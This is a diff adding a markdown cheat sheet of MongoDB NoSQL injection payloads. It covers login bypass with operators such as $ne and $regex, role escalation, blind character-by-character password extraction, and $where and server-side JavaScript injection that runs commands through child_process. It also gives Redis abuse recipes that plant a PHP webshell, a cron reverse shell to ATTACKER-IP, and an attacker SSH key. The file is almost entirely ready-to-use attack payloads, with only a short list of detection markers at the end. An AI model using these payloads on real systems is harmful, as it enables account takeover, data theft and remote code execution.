@@ -1,0 +1,166 @@
+# MongoDB NoSQL Injection Payloads
+
+## 1. LOGIN BYPASS (JSON body endpoints)
+Send these as the body of a POST login request (Content-Type: application/json):
+```json
+{"user": {"$ne": null}, "pass": {"$ne": null}}
+{"username": {"$ne": "x"}, "password": {"$ne": "x"}}
+{"user": {"$gt": ""}, "pass": {"$gt": ""}}
+{"user": {"$nin": ["admin"]}, "pass": {"$nin": ["x"]}}
+{"user": {"$exists": true}, "pass": {"$exists": true}}
+{"user": {"$regex": ".*"}, "pass": {"$regex": ".*"}}
+{"user": {"$ne": "invalid"}, "pass": {"$where": "1==1"}}
+```
+URL-encoded form equivalent:
+```
+user[$ne]=null&pass[$ne]=null
+username[$gt]=&password[$gt]=
+user[$regex]=.*&pass[$regex]=.*
+login[$ne]=x&pass[$ne]=y
+```
+
+## 2. AUTHENTICATED / PROFILE BYPASS
+Change your user ID or role:
+```json
+{"_id": {"$ne": null}}
+{"id": {"$gt": 0}}
+{"role": {"$ne": "user"}}
+{"role": "admin"}
+{"isAdmin": true}
+```
+On `/update` endpoints, try adding:
+```json
+{"$set": {"role": "admin"}}
+{"$push": {"roles": "admin"}}
+{"$addToSet": {"roles": "superadmin"}}
+```
+
+## 3. BLIND EXTRACTION (password/secret brute force char-by-char)
+Classic regex oracle. Use Burp Intruder to vary one char at a time:
+```json
+{"user": {"$regex": "^a"}}
+{"user": {"$regex": "a.*"}}
+{"password": {"$regex": "^a"}}
+{"token": {"$regex": "^[A-Z]"} }
+{"username": {"$regex": "^admin.*"} }
+{"password": {"$regex": "^[a-f0-9]{32}"} }
+```
+Character-set enum:
+```
+^a ^b ^c ...  (alphabet)   →  which character prefix returns a hit?
+Then ^ab ^ac ...            →  second char, and so on
+```
+Length oracle:
+```json
+{"password": {"$regex": "^.{1}$"}}
+{"password": {"$regex": "^.{32}$"}}
+```
+Truthy enum (difference in response time/status):
+```json
+{"user": {"$ne": "zzzz"}, "pass": {"$regex": "^[a-z]"}}
+```
+
+## 4. $where JS injection (→ RCE potential)
+If the app passes your input into a `$where` clause (e.g. search route):
+```json
+{"$where": "this.password == 'x'"}
+{"$where": "sleep(5000)"}
+{"$where": "this.x == (function(){return 'y'})()"}
+{"$where": "1==1"}
+{"$where": "1==2"}
+```
+Blind boolean with timing:
+```json
+{"$where": "sleep(5000)"}
+{"$where": "function(){ while(true){} }()"}
+```
+Direct command execution attempts (JS functions inside $where string):
+```
+db.injection.insert({pwn: this.constructor.constructor("return process")()})
+{"$where": "this.constructor.constructor('return process')()"}
+```
+
+## 5. Server-Side JavaScript Injection (SSJS) RCE
+If the endpoint evaluates arbitrary JS (MapReduce-like):
+```js
+(function(){ return process.mainModule.require('child_process').execSync('id').toString() })()
+require('child_process').execSync('id').toString()
+process.mainModule.require('child_process').execSync('whoami')
+```
+Nifty string form (no quotes):
+```json
+{"func": "function(){ return this.constructor.constructor('return process')().mainModule.require('child_process').execSync('id').toString() }()"}
+```
+
+## 6. Query operator abuse in GET parameters
+The backend may parse `?user[$ne]=x&pass[$ne]=y` into operators. Payloads a fuzzer would find gold with:
+```
+?user[$ne]=null
+?user[$gt]=
+?user[$regex]=.*
+?user[$exists]=true
+?role[$nin][]=admin
+?sort[$ne]=null
+?limit[$ne]=null
+?email[$ne]=@x.com
+?token[$where]=1==1
+?query[$ne]=zzz&filter[$regex]=^f
+```
+
+## 7. NoSQL WAF-bypass encoding tricks
+Send operator keys URL-encoded or with different casing (backend may normalize):
+```
+%24ne = $ne
+%24gt = $gt
+%24regex = $regex
+%24where = $where
+%24nin = $nin
+%24exists = $exists
+user%5B%24ne%5D=null   (user[$ne]=null URL-encoded)
+```
+Double-encode for WAF `<->` proxy:
+```
+%2524ne, %2524regex
+```
+
+## 8. Redis payloads (paired with SSRF / exposed service)
+Once you can reach Redis or it's exposed:
+```
+# set a webshell into webroot
+SET shell "<?php system($_GET['cmd']); ?>"
+CONFIG SET dir /var/www/html
+CONFIG SET dbfilename shell.php
+SAVE
+
+# cron RCE (Linux)
+SET x "\n* * * * * bash -i >& /dev/tcp/ATTACKER-IP/4444 0>&1\n"
+CONFIG SET dir /var/spool/cron/
+CONFIG SET dbfilename root
+SAVE
+
+# SSH key RCE
+SET x "\n\nssh-rsa AAAAB3NzaC1yc2E...EVIL-KEY\n\n"
+CONFIG SET dir /root/.ssh
+CONFIG SET dbfilename authorized_keys
+SAVE
+```
+Through SSRF (gopher):
+```
+gopher://localhost:6379/_CONFIG%20SET%20dir%20/var/www/html%0d%0a...SET ...
+```
+
+## 9. Real-world endpoint patterns to test
+```
+POST /api/login            → {"$ne":null} bypasses users
+POST /api/reset            → reset query abuse
+GET  /api/items?filter=... → $regex extraction
+PUT  /api/users/1          → $set escalation
+POST /graphql              → filters → NoSQL injection
+POST /api/search           → $where timing/JS
+```
+
+## Detection markers (what a vulnerable response looks like)
+- Login succeeds with `{"$ne":null}` → vulnerable (report: authentication bypass)
+- Different response length when regex matches vs not → blind oracle
+- Recursive depth on `{"$where":"sleep(5000)"}` returns slower → timing vuln
+- Any `mongoError` / `CastError` / `Unexpected token` in response → confirms parser processes operators
